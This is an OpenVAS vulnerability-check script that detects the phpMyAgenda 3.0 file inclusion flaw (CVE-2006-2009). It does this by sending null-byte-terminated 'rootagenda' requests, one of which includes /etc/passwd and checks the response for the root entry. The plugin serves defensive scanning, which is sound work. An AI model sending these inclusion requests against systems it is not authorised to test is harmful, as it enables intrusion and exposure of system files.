# OpenVAS Vulnerability Test
# $Id: phpMyAgenda_30final_file_include.nasl 4489 2016-11-14 08:23:54Z teissa $
# Description: phpMyAgenda version 3.0 File Inclusion Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP application that is prone to
remote and local file inclusions attacks.

Description :

phpMyAgenda is installed on the remote system. It's an open source
event management system written in PHP.

The application does not sanitize the 'rootagenda' parameter in some
of it's files. This allows an attacker to include arbitrary files from 
remote systems and parse them with privileges of the account under
which the web server is started.

This vulnerability exists if PHP's 'register_globals' & 'magic_quotes_gpc'
are both enabled for the local file inclusions flaw. 
And if 'allow_url_fopen' is also enabled remote file inclusions are also
possible.";

tag_solution = "No patch information provided at this time.
Disable PHP's 'register_globals'";

# Original advisory / discovered by : 
# http://www.securityfocus.com/archive/1/431862/30/0/threaded

if (description) {
 script_id(200002);
 script_version("$Revision: 4489 $");
 script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
 script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_cve_id("CVE-2006-2009");
 script_bugtraq_id(17670);

 name = "phpMyAgenda version 3.0 File Inclusion Vulnerability";
 script_name(name);
 summary = "Checks for a possible file inclusion flaw in phpMyAgenda";

 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/431862/30/0/threaded");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

dirs = make_list("/phpmyagenda", "/agenda", cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/agenda.php3"), port:port);
 #debug_print("res: ", res, "\n");
 
 if(egrep(pattern:"<a href=[^?]+\?modeagenda=calendar", string:res)) {
  file[0] = string("http://", get_host_name(), dir, "/bugreport.txt");
  file[1] = "/etc/passwd";

  req = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[0], "%00"), port:port);
  #debug_print("request1= ", req, "\n");

  recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
  #debug_print("receive1= ", recv, "\n");
  if (recv == NULL) exit(0);

  if ("Bug report for phpMyAgenda" >< recv) {
   security_message(port);
   exit(0);
  }
  else { 
   # Maybe PHP's 'allow_url_fopen' is set to Off on the remote host.
   # In this case, try a local file inclusion.
   req2 = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[1], "%00"), port:port);
   #debug_print("request2= ", req2, "\n");

   recv2 = http_keepalive_send_recv(data:req2, bodyonly:TRUE, port:port);
   #debug_print("receive2= ", recv2, "\n");
   if (recv2 == NULL) exit(0);
  
   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv2)) {
    # PHP's 'register_globals' and 'magic_quotes_gpc' are enabled on the remote host.
    security_message(port);
    exit(0);
   }
  }
 }
}
